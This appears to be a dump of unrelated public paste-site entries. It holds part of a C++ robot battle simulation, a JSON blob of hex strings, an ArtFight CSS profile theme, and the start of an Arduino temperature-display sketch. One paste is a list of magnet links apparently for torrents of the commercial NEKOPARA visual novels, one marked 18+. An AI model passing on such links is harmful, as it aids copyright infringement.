    cout << ""["" << RobotQ[0] -> getLabel() << ""]"" << ""("" << RobotQ[0] -> getType() << "")""<< RobotQ[0] -> getName() << "" Respawned at ("" << x << "","" << y << "")"" << endl;
    output << ""["" << RobotQ[0] -> getLabel() << ""]"" << ""("" << RobotQ[0] -> getType() << "")""<< RobotQ[0] -> getName() << "" Respawned at ("" << x << "","" << y << "")"" << endl;
    RobotQ[0] = nullptr;

    // Move other robots forward in queue
    for (int i = 0; i < size; i++)
    {
        RobotQ[i] = RobotQ[i+1];
    }

    // Set the last element to null
    RobotQ[size - 1] = nullptr;

    return *Bfield;
}


/*
------------------------------------MAIN---------------------------
*/

int main()
{
    //initialize variables
    //Battlefield and Robots
    int m, n, steps, robots;
    string robotTypes[7] = {""robocop"", ""terminator"", ""bluethunder"" , ""madbot"", ""robotank"", ""terminatorrobocop"", ""ultimaterobot""};
    //Amount of Robot Lives;
    int lives = 3;

    //char array to store unique characters for each robot 1-9, A-Z, a-z, total 60 characters.
    char uniqueChar[60];
    int ch = '1';

    for (int c = 0; c <= 61; c++) {
        if (ch == ':')
            ch = 'a';
        else if (ch > 'z')
            ch = 'A';
        uniqueChar[c] = ch;
        ch++;
    }


    //SRAND to set RAND seed
    srand(time(0));


    //Initializing input file and variable to store input lines
    ifstream inFile(""fileInput.asm"");
    string Input;

    //Open output file to display output
    ofstream output(""Output.txt"");


    //Count for number of line of Inputs in input file
    int inCount = 0;

    if(inFile)
    {

        cout << endl << endl;
        cout << ""Simulation Starting..."" << endl;
        cout << endl << endl;

        //Output file
        output << endl << endl;
        output << ""Simulation Starting..."" << endl;
        output << endl << endl;

        //Getting all data from input file
        while(inCount < 3)
        {
            getline(inFile, Input);
            bool isLineParsed = false;

            while(!isLineParsed)
            {
                Input = trim(Input);

                switch(inCount)
                {
                    // Case 0 gets Battlefields size M and N.
                    case 0:
                    {
                        //Dimensions of the battlefield. E.g: 40 50
                        stringstream dimensions(Input.substr(8));
                        dimensions >> m >> n;
                        cout << ""Battlefield size: "" << m << "" by "" << n << endl << endl;
                        output << ""Battlefield size: "" << m << "" by "" << n << endl << endl;
                        break;
                    }

                    // Case 1 gets the number of turns for the robot war.
                    case 1:
                    {
                        auto findColon = Input.find("":"");
                        steps = stoi(Input.substr(findColon+1));
                        cout << ""Turns: "" << steps << endl << endl;
                        output << ""Turns: "" << steps << endl << endl;
                        break;
                    }

                    // Case 2 get the number of robots
                    case 2:
                    {
                        auto findColon = Input.find("":"");
                        robots = stoi(Input.substr(findColon+1));
                        cout << ""Robots: "" << robots << endl << endl << endl;
                        output << ""Robots: "" << robots << endl << endl << endl;

                        //if too many robots
                        if (robots > 61)
                        {
                            ofstream output(""Output.txt"");
                            cout << ""Error: Too many robots"" << endl;
                            cout << ""Robot amount exceeds limit of 61"" << endl;

                            output << ""Error: Too many robots"" << endl;
                            output << ""Robot amount exceeds limit of 61"" << endl;
                            output.close();
                            exit(0);
                        }

                        else if (robots > m*n)
                        {
                            ofstream output(""Output.txt"");
                            cout << ""Too many robots"" << endl;
                            cout << ""Robot amount exceeds size of battlefield: "" << m*n << endl;
                            output << ""Too many robots"" << endl;
                            output << ""Robot amount exceeds size of battlefield: "" << m*n << endl;
                            output.close();
                            exit(0);
                        }
                        break;
                    }

                }//switch end


                //Check if the input file line is empty
                if (Input.empty())
                {
                    break;
                }

                isLineParsed = true;
            }

            inCount++;
        }


        //Making a Battlefield using 2-Dimensional array
        n = n*2+3;//*2+3 is for output manipulation and borders
        m += 2;//+2 for the borders
        char Battlefield[m][n];
        for(int i=0; i<m; i++)
        {
            for(int j=0; j<n; j++)
            {

                // Corners
                if ((i == 0 && (j == 0 || j == n-1)) || (i == m-1 && (j == 0 || j == n-1)))
                {
                    Battlefield[i][j] = '+';
                }

                // Left-Right Edges
                else if ((j == n-1) || (j == 0))
                {
                    Battlefield[i][j] = '|';
                }

                // Top-Bottom
                else if ((i == 0) || (i == m-1))
                {
                    Battlefield[i][j] = '-';
                }

                // Valid movement tiles
                // Robots are in even tiles
                else if(j == 2 || j%2 == 0)
                {
                    Battlefield[i][j] = '-';
                }

                // Empty space
                else
                {
                    Battlefield[i][j] = ' ';
                }
            }
        }


        //Making a pointer array to put Robot objects
        Robot *Robots[robots];

        //Pointer array as queue for dead robots to re-enter the battlefield
        Robot *RobotQ[robots] = {nullptr};

        //While loop for robot creation
        int robotCount = 0;
        while(robotCount < robots)
        {

            getline(inFile,Input);
            if(Input.empty())
            {
                cout << endl << ""Error: Not enough robots to initiate entered in input file to match number of robots"" << endl;
                output << endl << ""Error: Not enough robots to initiate entered in input file to match number of robots"" << endl;
                output.close();
                exit(0);
            }


            if(inCount > 2)
            {

                //Taking each input file line for robot creation and turning it into an input using string stream
                stringstream bots(Input);
                string type, typelower, name, PosX, PosY;
                int x = 0;
                int y = 0;

                //The string stream is used to put each line of input isolated by spaces into its own variables
                bots >> type >> name >> PosX >> PosY;
                typelower = type; //variable for lowercasing robot type

                // while loop for getting and randomizing robot positions
                while(Battlefield[y][x*2] != '-')
                {
                    if(PosX != ""random"" && PosY != ""random"" && (stoi(PosX) < 1 || stoi(PosX)*2 > n-3 || stoi(PosY) < 1 || stoi(PosY) > m-1))
                    {
                        cout << endl << ""Error: Invalid robot position found at line number "" << inCount+1 << "" in input file."" << endl;
                        output << endl << ""Error: Invalid robot position found at line number "" << inCount+1 << "" in input file."" << endl;
                        output.close();
                        exit(0);
                    }

                    else if(PosX == ""random"" && PosY == ""random"")
                    {
                        x = rand() % (n-3)/2+1;
                        y = rand() % (m-2)+1;
                    }

                    else if(PosX == ""random"")
                    {
                        x = rand() % (n-3)/2+1;
                        y = stoi(PosY);
                    }

                    else if(PosY == ""random"")
                    {
                        y = rand() % (m-2)+1;
                        x = stoi(PosX);
                    }

                    else
                    {
                        x = stoi(PosX);
                        y = stoi(PosY);
                    }
                }


                //Convert robot type to lowercase
                transform(typelower.begin(), typelower.end(), typelower.begin(), ::tolower);

                //Get the index of robot type from array[robotTypes] to use in switch
                string *target = find(&robotTypes[0], robotTypes + sizeof(robotTypes) / sizeof(robotTypes[0]), typelower);
                int index = target - robotTypes;

                //Creating robot objects based on their robot types(e.g. RoboCop, MadBot) and putting them into array of Class Robot to upcast
                switch(index)
                {

                    case 0:
                    {
                        Robots[robotCount] = new RoboCop(name, uniqueChar[robotCount], lives, x, y);
                        break;
                    }

                    case 1:
                    {
                        Robots[robotCount] = new Terminator(name, uniqueChar[robotCount], lives, x, y);
                        break;
                    }
                    case 2:
                    {
                        Robots[robotCount] = new BlueThunder(name, uniqueChar[robotCount], lives, x, y);
                        break;
                    }
                    case 3:
                    {
                        Robots[robotCount] = new MadBot(name, uniqueChar[robotCount], lives, x, y);
                        break;
                    }
                    case 4:
                    {
                        Robots[robotCount] = new RoboTank(name, uniqueChar[robotCount], lives, x, y);
                        break;
                    }
                    case 5:
                    {
                        Robots[robotCount] = new TerminatorRoboCop(name, uniqueChar[robotCount], lives, x, y);
                        break;
                    }
                }
                cout << setw(8) << Robots[robotCount] -> getName() << ""["" << Robots[robotCount] -> getType() << ""] - Status: Deployed"" << endl;
                output << setw(8) << Robots[robotCount] -> getName() << ""["" << Robots[robotCount] -> getType() << ""] - Status: Deployed"" << endl;

                for(int i=0; i<robotCount; i++)
                {
                    if(i != robotCount)
                    {
                        if(Robots[i] -> getPosX() == Robots[robotCount] -> getPosX() && Robots[i] -> getPosY() == Robots[robotCount] -> getPosY())
                        {
                            cout << endl << ""Error: Starting robot positions cant be the same. found at line number "" << inCount+1 << "" in input file."" << endl;
                            output << endl << ""Error: Starting robot positions cant be the same. found at line number "" << inCount+1 << "" in input file."" << endl;
                            output.close();
                            exit(0);
                        }
                    }
                }

            }

            robotCount++;
            inCount++;

        }

        //Puts robots into the battlefield
        for (int r=0; r<robots; r++)
        {
            Battlefield[Robots[r] -> getPosY()][Robots[r] -> getPosX()*2] = Robots[r] -> getLabel();
        }

        //Starting battlefield
        cout << endl << endl << ""Starting Battlefield"" << endl;
        output << endl << endl << ""Starting Battlefield"" << endl;
        for(int i=m-1; i>-1; i--)
        {
            for(int j=0; j<n; j++)
            {
                cout << Battlefield[i][j];
            }
            cout << endl;
        }
        cout << endl << endl << endl;

        //Output
        int turn = steps;
        int deadRobots = 0;
        while(turn-- && deadRobots != (robots-1))// Simulation will continue until there are no turns left (turn = 0) or if there is 1 robot left
        {
            // Display current number of turn
            cout << ""Turn: "" << steps - turn << endl;
            output << ""Turn: "" << steps - turn << endl;

            // Respawn the first robot in queue if there is one
            if(RobotQ[0] != nullptr)
            {
                output << ""-------------------------------------------------"" << endl;
                cout << ""-------------------------------------------------"" << endl;
                respawn(RobotQ, Robots, robots, (char*)Battlefield, m, n, output);
                cout << ""-------------------------------------------------"" << endl << endl;
                output << ""-------------------------------------------------"" << endl << endl;
            }

            // Loop for each robot to do it's action during this turn
            for(int i=0; i<robots ;i++)
            {
                bool isAlive;
                int index;

                // If robot is not Permanently dead (died 3 times)
                if(!(Robots[i] == nullptr))
                {
                    //Get robot type
                    string typelower = Robots[i] -> getType();

                    //Convert robot type to lowercase
                    transform(typelower.begin(), typelower.end(), typelower.begin(), ::tolower);

                    //Get the index of robot type from array[robotTypes] to use in switch
                    string *target = find(&robotTypes[0], robotTypes + sizeof(robotTypes) / sizeof(robotTypes[0]), typelower);
                    index = target - robotTypes;

                    if(!Robots[i] -> getAlive())
                    {
                        index = 7;
                    }
                }

                // If robot is Permanently dead
                else if(Robots[i] == nullptr)
                {
                    index = 8;
                }

                if(index < 7)
                {
                    cout << *Robots[i] << ""'s turn"" << endl;
                    output << *Robots[i] << ""'s turn"" << endl;
                }

                // Finding which robot type's turn it is
                switch(index)
                {
                    case 0: //RoboCop
                    {
                        Robots[i] -> move((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }

                    case 1: //Terminator
                    {
                        Robots[i] -> look((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 2: //BlueThunder
                    {
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 3: //MadBot
                    {
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 4: //RoboTank
                    {
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 5: //TerminatorRoboCop
                    {
                        Robots[i] -> look((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 6: //UltimateRobot
                    {
                        Robots[i] -> look((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        Robots[i] -> fire((char*)Battlefield, m, n, output);
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 7: //Robot Waiting to be respawned
                    {
                        cout << *Robots[i] << "" is waiting to be respawned"" << endl;
                        output << *Robots[i] << "" is waiting to be respawned"" << endl;
                        cout << endl;
                        output << endl;
                        break;
                    }
                    case 8: //Robot is Permanently dead
                    {
                        break;
                    }

                }


                // Checks robots' status by end of each robot's turn
                for(int i=0; i<robots ;i++)
                {

                    // Bool to check if a robot is already in queue to respawn
                    bool inQ = false;

                    // If robot is already permanently dead, ignore this loop
                    if(Robots[i] != nullptr)
                    {
                        Robots[i] -> checkAlive((char*)Battlefield, m, n);

                        // Check inQ Bool
                        for(int k=0; k<robots; k++)
                        {
                            if(RobotQ[k] == Robots[i])
                            {
                                inQ = true;
                                break;
                            }
                        }

                        // If another robot is killed by the end of the current robot's turn
                        if(!Robots[i] -> getAlive() && !inQ)
                        {
                            Robots[i] -> minusLife();
                            // If a robot lost it's last life this turn
                            if(Robots[i] -> getLives() == 0)
                            {
                                cout << ""["" << Robots[i] -> getLabel() << ""]"" << Robots[i] -> getName() << "" has lost all 3 lives and cannot be respawned!"" << endl << endl;
                                output << Robots[i] -> getName() << "" has lost all 3 lives and cannot be respawned!"" << endl << endl;
                                Robots[i] = nullptr;
                                deadRobots++;
                            }
                            else
                            {
                                killed(RobotQ, Robots, robots, i);
                            }
                        }
                    }

                }

                // Robot upgrades (Check if current robot is not permanently dead and reached 3 kills
                if(Robots[i] != nullptr && Robots[i] -> getKills() == 3)
                {
                    if(Robots[i] -> getType() == ""RoboCop"" || Robots[i] -> getType() == ""Terminator"")
                    {
                        TerminatorRoboCop* newTRC = new TerminatorRoboCop(Robots[i] -> getName(), Robots[i] -> getLabel(), Robots[i] -> getLives(), Robots[i] -> getPosX(), Robots[i] -> getPosY());
                        delete Robots[i];
                        Robots[i] = nullptr;
                        Robots[i] = newTRC;
                    }
                    else if(Robots[i] -> getType() == ""RoboTank"" || Robots[i] -> getType() == ""TerminatorRoboCop"")
                    {
                        UltimateRobot* newUltimate = new UltimateRobot(Robots[i] -> getName(), Robots[i] -> getLabel(), Robots[i] -> getLives(), Robots[i] -> getPosX(), Robots[i] -> getPosY());
                        delete Robots[i];
                        Robots[i] = nullptr;
                        Robots[i] = newUltimate;
                    }
                }

            }

            //Output Battlefield
            for(int i=m-1; i>-1; i--)
            {
                for(int j=0; j<n; j++)
                {
                    cout << Battlefield[i][j];
                }
                cout << endl;
            }

            cout << endl;

            //Output Battlefield into output file
            for(int i=m-1; i>-1; i--)
            {
                for(int j=0; j<n; j++)
                {
                    output << Battlefield[i][j];
                }
                output << endl;
            }
            output << endl;

            //Removes hit markers '*' from Battlefield
            for(int i=0; i<m; i++)
            {
                for(int j=0; j<n; j++)
                {
                    if(Battlefield[i][j] == '*')
                        Battlefield[i][j] = '-';
                }
            }

            // Displays all robots' killcount
            cout << ""Robots' Lives and Kills:"" << endl;
            output << ""Robots' Lives and Kills:"" << endl;
            for(int i=0; i<robots ;i++)
            {
                if(Robots[i] != nullptr)
                {
                        cout << ""["" << Robots[i] -> getLabel() << ""]"" << Robots[i] -> getName() << "" - Lives: "" << Robots[i] -> getLives()<< "" Kills: "" << Robots[i] -> getKills() << endl;
                        output << ""["" << Robots[i] -> getLabel() << ""]"" << Robots[i] -> getName() << "" - Lives: "" << Robots[i] -> getLives()<< "" Kills: "" << Robots[i] -> getKills() << endl;
                }
            }


            cout << endl << endl << endl;
            output << endl << endl << endl;

        }

        for(int i = 0; i < robots; ++i) {
            if(Robots[i] != nullptr && turn > 0)
            {
                cout << ""----------------------------------------------------------"" << endl;
                cout << ""["" << Robots[i]->getLabel() << ""]"" << Robots[i]->getName() << "" is the Last Robot Standing!"" << endl;
                cout << ""----------------------------------------------------------"" << endl;
                output << ""----------------------------------------------------------"" << endl;
                output << ""["" << Robots[i]->getLabel() << ""]"" << Robots[i]->getName() << "" is the Last Robot Standing!"" << endl;
                output << ""----------------------------------------------------------"" << endl;
            }
        }

        cout << endl <<""The simulation has ended"" << endl << endl;
        output << endl <<""The simulation has ended"" << endl << endl;

    }//Infile end

    else
    {
        //Shows error if file is not open
        ofstream output(""Output.txt"");
        cout << ""Error message: file is not found"" << endl;
        output << ""Error message: file is not found"" << endl;
        output.close();

        return EXIT_FAILURE;
    }

    // Close input file
    inFile.close();

    // Close output file
    output.close();


    return 0;
}
"
u0PVeqnq,data973,TestGuy1,JSON,Sunday 30th of June 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b82c64d3bcf2a0903d1816bc2ce70f65a929bfb4756e64df21d6ce1eaa3141f894426577eeb96b85b3d3b97bb41e66074fe5d6b20904da430cee045c269559b690bfb69d7447541ecc645af7b948188abe108d752b0709c8eeb97a81989472af745a12c03809a89c386e96329f43de6d728a0945a9db46039803d486302cd5af',
  otherdata: [
    '4d9e6313a4f46f8d4149d3868eda35a7',
    'e1f481b212ccaade6abe7b31c1e10483',
    '6944b757f3ff6c0cf1b69575797d10dd',
    '6bcdd7b16b28c05e4be29149d1473cd5',
    '32780cc4792f79d75cbbd1da5f70087d',
    '210c7483753bda803304be1ebb73e1cd',
    '9041ce7cd1088ff60ff6cbffc249e635',
    '1de56276d3e9cf5cead9b65a1fa17d62'
  ]
}"
6VxtfEj1,mylinks,edward4324,JSON,Sunday 30th of June 2024 05:29:36 AM CDT,"{
     ""name"": ""mylinks"",
     ""downloads"": [
        {
          ""title"": ""NEKOPARA Vol.1 [VN][NEKO WORKs][18+][ENG/JAP/CHN]"",
          ""uris"": [
            ""magnet:?xt=urn:btih:6D1802EADE990E737AACBB5BCE3F691B36ED93C6""
          ],
          ""uploadDate"": ""2015-01-09T19:23:00Z"",
          ""fileSize"": ""3.5 GB""
        },
       {
          ""title"": ""NEKOPARA Vol. 0"",
          ""uris"": [
            ""magnet:?xt=urn:btih:657D9D7462993AB4C2C7FF19A7CE249B911BED40""
          ],
          ""uploadDate"": ""2015-08-17T13:14:00Z"",
          ""fileSize"": ""539.8 MB""
        },
        {
          ""title"": ""NekoPara Vol.2"",
          ""uris"": [
            ""magnet:?xt=urn:btih:83AC5C6692160138C6231519E372E4E5BAC9FC24""
          ],
          ""uploadDate"": ""2016-02-20T14:56:00Z"",
          ""fileSize"": ""3.9 GB""
        },
        {
          ""title"": ""NekoPara Vol.2"",
          ""uris"": [
            ""magnet:?xt=urn:btih:B22099D83C778F19AAB679CB99D3930D89FE494B""
          ],
          ""uploadDate"": ""2016-02-21T10:33:00Z"",
          ""fileSize"": ""1.7 GB""
        },
        {
          ""title"": ""NekoPara Vol.1"",
          ""uris"": [
            ""magnet:?xt=urn:btih:A0F36765C531D3F91D3FDA00157254E9F5B08C0D""
          ],
          ""uploadDate"": ""2016-04-29T16:44:00Z"",
          ""fileSize"": ""1.8 GB""
        },
            {
          ""title"": ""NekoPara Vol.2"",
          ""uris"": [
            ""magnet:?xt=urn:btih:D391640639A8199082F9F6BE0134033F37C6785A""
          ],
          ""uploadDate"": ""2016-07-13T08:25:00Z"",
          ""fileSize"": ""1.7 GB""
        },
        {
          ""title"": ""NEKOPARA Vol.3"",
          ""uris"": [
            ""magnet:?xt=urn:btih:756AC326A78E1E03118F0142EDE3C59C2F5A9BAA""
          ],
          ""uploadDate"": ""2017-05-27T03:48:00Z"",
          ""fileSize"": ""3.2 GB""
        },
        {
          ""title"": ""Nekopara Vol. 4"",
          ""uris"": [
            ""magnet:?xt=urn:btih:3E5C19FD7F999539CBB459C5C89BBA64865D108E""
          ],
          ""uploadDate"": ""2021-10-01T00:07:00Z"",
          ""fileSize"": ""5.2 GB""
        },
        {
          ""title"": ""NEKOPARA Extra"",
          ""uris"": [
            ""magnet:?xt=urn:btih:E477C7FDD6A3FF1CD3A39D04F7A1AAD9D1531933""
          ],
          ""uploadDate"": ""2022-08-13T12:44:00Z"",
          ""fileSize"": ""1.2 GB""
        }
    ]
}"
CtuVy4Nk,Official ArtFight Seafoam CSS Theme,LeafJelly,CSS,Sunday 30th of June 2024 03:39:56 AM CDT,"/*
* Official Seafoam CSS Theme
* Code by @cyxxie and @leafjelly
* Assets by @leafjelly
* Pagedoll by @Spiderccino
* Feel free to report any bugs!
* This code is free-to-use! You may modify as you see fit
*/

.container-fluid{
 width:1300px!important;
 margin:auto;
}

#wrapper {
	background: url(https://images.artfight.net/resources/seabg2.jpg);
	background-size: contain!important;
	background-repeat: repeat-x;
	background-position: bottom;
	background-attachment: fixed;
}


/* PageDoll 
* Adjust the margin-top to move your pagedoll up and down
* Adjust the Height and Width to best fit your image
* Looks best with a Transparent png
*/
.card-body.panel-body.profile-avatar-panel {
	background-image: url(https://images.artfight.net/resources/spunch-200.gif) !important;
	background-size:contain !important;
	background-repeat:no-repeat!important;
	background-position:center!important;
	background:none;
	height: 200px;
	width: 200px;
	border: none;
	margin-top:-40px;
}
.card-body span.icon-user{display:none}
@media screen and (max-width: 766px) {.card-body span.icon-user {display:block;background:rgba(0,72,84,0.8);}}

/*User Info*/
.card.panel.float-left.d-none.d-md-block.profile-avatar-wrapper {
  border: none;
}

.profile-header-background.panel-heading.bg-light.p-2.border.rounded.position-relative {
  background-image: url(https://images.artfight.net/resources/seaheader.png);
  background-size:250px;
  border: none !important;
  padding:15px !important;
}

.profile-header-wrapper.clearfix {
  background:rgba(0,72,84,.8);
  border: #6fddc0 solid 2px;
  width:86% !important;
  margin-left:1%;
  display: inline-block  !important;
}

.profile-header-name a {
  color: #1a5164!important;
}
.element-disabled.text-muted.h5{
  color: #0d3e50!important;
  opacity: .8;
}
.d-none.d-md-block.mt-3.profile-header-normal-status {
  font-size:smaller;
}

.card-header.panel-heading{font-weight: bold;}
.card.panel.float-left.d-none.d-md-block.profile-avatar-wrapper {
  background: none;
  border:none;
}
.panel-heading{
  background-image: url(https://images.artfight.net/resources/seaheader.png);
  background-size:250px;
  border: #23A196 solid 2px;
  color: #003b4b !important;
}
.username-navbar span {
  color: #b5ffbb!important;
}

.profile-header-mobile-status .card-body{
  background:none;
  padding:.5em;
}
.d-block .d-md-none .mt-3 .profile-header-mobile-status{margin:0}
.card.profile-avatar-wrapper, .profile-header-mobile-status .card {
	background: none; border:none;
}
/*Navigation Tabs*/
.nav-tabs {
  width:12%;
  Margin:0 0 0 -8px !important;
  display: inline-block  !important;
  padding:4px !important;
  border:none;
  font-variant:small-caps;
}

.nav-tabs .nav-item {
  text-align: center;
  border: none;
}

.nav-link.active, a.btn.btn-primary.active, .page-item.active .page-link{
	background: #6fddc0 !important;
	font-style: italic;
	text-transform: uppercase;
	color: #05276b !important;
}

.nav-tabs .nav-item:hover, .nav-tabs .nav-link:hover {
  background: #5bc8ab!important;
  color: #164980!important;
}
.nav-tabs .nav-link{
  background: rgba(0,72,84,.8);
  color:#c4ffda;
  padding:5px;
  border:#7bdddd solid !important;
  border-width: 2px 2px 2px 0 !important;
}

/* Profile Description Box*/
.profile-description.mb-4.clearfix {
  margin:1em !important;
  background: rgba(0,72,84,.8);
  min-height: 350px !important;
  max-height: 600px !important;
  overflow: auto!important;
  border: #a8ffd2 solid 2px;
  padding: 20px 25px;
  float: right;
  width: 72%;#3d0020
}

/* Followers and Links */
.profile-links.col-md-6 {
  min-width: 100%;
}

.profile-links .table-card{
  font-size:small;
}

td a{
  color: #d4e3ed;
}
td a:hover{
  color: #aad1eb1;
}
.card-footer.panel-footer.text-right a{
  color:#18415c;
}

.card-footer.panel-footer.text-right a:hover{
  color:#0e5d91;
}

.w-25.text-right.bg-light.active {
  background: url() top;
	border: #17716d solid;
	border-width: 0 0 1px 0;
	background-color: #209b95 !important;
	color: #FFF;
}
.table.table-bordered.table-card {
  background: rgba(0,72,84,0.8);color#FFF;
  color:#FFF!important;
  border: #23A196  solid;
  border-width: 0 2px 2px 2px;
}
.table-bordered td {
  padding:4px 11px;
  border: #44a8a4 solid 1px;
}


td.w-25.text-right.bg-light.active {
	font-weight: lighter;
}

.profile-followers.col-md-6 {
	min-width: 100%;
}

.profile-followers .card-body.panel-body{
  background:rgba(0,72,84, .9);
  text-align: center;
  padding: 2px 36px;
  Height:200px;
  overflow:auto;
  border: #23A196 solid;
  border-width: 0 2px;
}

.progress {
    background-color: #05475a!important;
}

.profile-followers .card-header.panel-heading, .profile-overall-stats .card-header.panel-heading, .profile-current-stats .card-header.panel-heading, .achievement-panel  .card-header.panel-heading {
    border-bottom: #267871 solid 2px !important;
}

.achievement-panel .card-body.panel-body {
    border: #23A196  solid;
    border-width: 0 2px 2px 2px;
}

.card-body.panel-body,{
  background: rgba(0,72,84,0.8);
  overflow:auto;
}

.col-6.col-md-4.profile-follower {
  min-width: 100% !important;
  font-weight:lighter;
  padding:2px
}

.card-footer.panel-footer.text-right {
	padding: 3px;
	background-color: #41ab9d;
	border:#23A196 1px solid !important;
}

.btn-warning, .btn-danger, .btn-success, .btn.btn-primary, #profile-dropdown, .dropdown-menu.dropdown-menu-right.show {
	background: #6fddc0;
	border: #2f8fa5 solid 1px;
	color: #1c5795!important;
}

.btn.btn-primary:hover{
	background: #5bc8ab;
	color: #0f3b69!important;
}

.btn-warning:hover, .alert-warning{
	background: #e5af3f;
	border: #9d5810 solid 1px;
	color: #8d4200 !important;
}

.btn-success:hover, .alert-success{
	background: #1ba879;
	border: #0d7453 solid 1px;
	color: #00441b !important;
}

.btn-danger:hover, .alert-danger{
	background: #ca5858;
	border: #830202 solid 1px;
	color: #4b0000 !important;
}

.card.panel.panel-default.mt-3 {
  background: none;
}

/*Profile Galleries*/
.card.panel.panel-default.profile-gallery-header.profile-attacks-header.mt-3{
  width:100%;
}

.profile-attacks-header .panel-heading, .profile-defenses-header .panel-heading, .profile-characters-header .panel-heading {
	font-variant:small-caps;
}

h2.d-flex.align-items-center.mb-0 {
	font-size: 23px;
}

.panel-heading a{
  color: #0059ab;
}
.panel-heading a:hover {
  color: #0078e7;
}

.card.p-1.m-1.thumb-attack.attack-thumb.thumbnail, .card.p-1.m-1.thumb-attack.character-thumb.thumbnail {
	border: #f38585 solid 3px !important;
	background: rgba(255, 164, 164, 0.8);
}
.nametag.thumbnail-width.h5.p-1.my-auto.bg-light.border.rounded.text-center.text-truncate, .nametag.bookmark-character.flex-shrink-0.h5.p-1.ml-1.my-auto.bg-light.border.rounded,.btn.btn-primary.form-control.btn-submit-once  {
  background: #23A196 !important;
  border: #178ca0 1px solid !important;
  color:#c4ffda !important;
  font-variant:small-caps;
}

.nametag.thumbnail-width.h5.p-1.my-auto.bg-light.border.rounded.text-center.text-truncate:hover, .nametag.bookmark-character.flex-shrink-0.h5.p-1.ml-1.my-auto.bg-light.border.rounded:hover, .btn.btn-primary.form-control.btn-submit-once:hover{
	background: #24b0a4 !important;
	border: #09a7b3 1px solid
	color:#e2fbeb!important;
}

.text-break i {
  color: #c4ffda !important;
}
.text-break i:hover{
  color:#aff1c8!important;
  text-decoration: none !important;
}

/*Comments*/
.comment .panel-body {
  background: rgba(0,72,84, .9)!important;
}

.comments h2, h2.profile-stats-title, h2.profile-characters-title, h2.profile-attacks-title,{
	background: rgba(0,72,84, .5);
	padding: 2px 10px;
	margin: 30px auto 5px auto;
	text-align: center;
	width: 22%;
}

h2.profile-defenses-title {
	background: rgba(0,72,84, .5);
	padding: 2px 10px;
}

/*Site User Interface*/
.artfight-nav.navbar.navbar-dark.navbar-static-top.navbar-expand-md.mb-0 {
  border-bottom: 3px #168b95 solid;
  background: #27a89e !important;
}

.navbar-brand div, .navbar-dark .navbar-nav .nav-link{
	color: #002338 !important;
}

.navbar-brand div:hover, .navbar-dark .navbar-nav .nav-link:hover{
	color: #00588c !important;
}

.dropdown-menu {
  background: #30aea0; color:#005758;
}
.dropdown-divider {
  border-color: #a5fff2;
}
.dropdown-menu a, .dropdown-menu .d-flex.align-items-center {
  color: #005758 !important;
}
.dropdown-header {
  Color: #a5fff2;
}
.badge.badge-info, .badge.badge-primary, .badge.badge-danger, {
  background: #79ffc7;color: #000!important;
}
.dropdown-item:hover {
  Background: #209189;
  Color: #003435!important;
}

.alert.alert-info {
	background: #e49faa !important;
	border: #d15673 solid 1px;
}
.alert.alert-info a {
  color: #b93554 !important;
}

.comment a, {
  color:#ffc5d3;
}

a .nav-link {
  color: #79ffc7;
}

.comments .card.panel {
  background: none;border:#9effc5 solid 1px;
}

.footer .contain {
	background-color: #003750 !important;
	color: #a3daff !important;
	border: none;
}
.page-item.disabled .page-link,  .page-link:hover {
  background: #27a89e !important;
  border: none;
}
.page-link {
  background: #27a89e;
  border: none;
}

.achievement-panel .card {
  background: rgba(0, 55, 80, .6); border:none;
}

p, div{
	color: #f7ffea;
}

a {
	color:#71daa6;
}

a:hover{
	color:#bbffdd;
}

/*Mobile Fixes*/
@media screen and (max-width: 766px){
 .container-fluid, .comments h2, h2.profile-stats-title, h2.profile-characters-title, h2.profile-attacks-title, h2.d-flex.align-items-center.mb-0 {
	width: 100%!important;
 }

 .profile-header-wrapper.clearfix, .nav-tabs {
	width: 100%!important;
	Margin: auto!important;
 }

  .profile-description.mb-4.clearfix {
	float: none !important;
	width: 100% !important;
	Margin: auto !important;
  }
  .profile-body {
	max-height: none!important;
	min-height: auto !important;
  }
  .col-6.col-md-4.profile-follower {
	height: inherit!important;
	min-width: inherit !important;
  }

  .profile-followers .card-body.panel-body{
	height: inherit !important;
  }
  
  h3.profile-header-name.text-center, .element-disabled{
  color: #0d3e50!important;
  opacity: .9 ;
  font-weight:bold !important;
  }
}"
RrvbnyT9,"""Sensor Display"" rev_07",pleasedontcode,Arduino,Sunday 30th of June 2024 02:59:37 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Sensor Display""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-06-30 07:57:59

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* DHT22 mengukur suhu dan kelembaban, hasilnya */
	/* ditampilkan pada LCD I2C 1602 (SDA: A4, SCL: A5). */
	/* LED hijau pada pin D3 menyala untuk suhu < 25¬∞C. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
